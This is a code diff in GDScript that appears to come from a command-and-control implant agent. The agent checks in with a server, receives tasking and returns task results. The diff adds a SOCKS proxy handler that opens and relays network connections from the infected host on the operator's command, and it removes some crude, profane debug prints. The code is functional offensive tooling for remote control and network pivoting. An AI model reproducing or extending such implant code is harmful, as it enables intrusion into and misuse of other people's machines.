@@ -2,11 +2,14 @@ extends Node
 
 var protocol = null
 
+const TransportSocks = preload("res://transport/socks.gd")
+
 signal post_response
 signal tasking
 
 var config = null
 var _sent_checkin_already = false
+var socks_connection = {}
 
 # Called when the node enters the scene tree for the first time.
 func _ready():
@@ -91,17 +94,13 @@ func _on_callback_timer_timeout():
 		return
 
 	if protocol.client_is_connected() == 1:
-		print("connected!!! is compelte?")
 
 		if config.is_checkin_complete():
-			print("yes! - callning client polls")
 			protocol.client_poll()
 		else:
-			print("oh shuiop - calling checkin...get tha tuuid bitch")
 			_send_checkin()
 			protocol.recv()
 	else:
-		print("calling client connect")
 		protocol.client_connect()
 
 	# leave here - in the event that a request to change it came in...
@@ -178,3 +177,25 @@ func create_task_response(status, completed, task_id, output, artifacts = [], cr
 		payload["responses"].append(task_response) # TODO: create internal queue of task_response items and just return them all when agent checkin occures?
 
 	return JSON.stringify(payload)
+
+func handle_socks(parameters):
+	var do_exit = parameters.get("exit")
+	var data = parameters.get("data")
+	var server_id = parameters.get("server_id")
+
+	if socks_connection.has(server_id):
+		socks_connection[server_id].send(data)
+		print("already opened - do the thing\n", data, "\n")
+		# send data
+		if do_exit:
+			print("you shuold exit/close connection and nuke server_id\n")
+			socks_connection[server_id].client_disconnect()
+			socks_connection[server_id].free()
+
+			socks_connection.erase(server_id)
+	else:
+		# new connection
+		if data != null and not do_exit:
+			print("new connectino to place")
+			socks_connection[server_id] = TransportSocks.new(self, server_id, data)
+			add_child(socks_connection[server_id]) # s.t. the _process is called every frame?
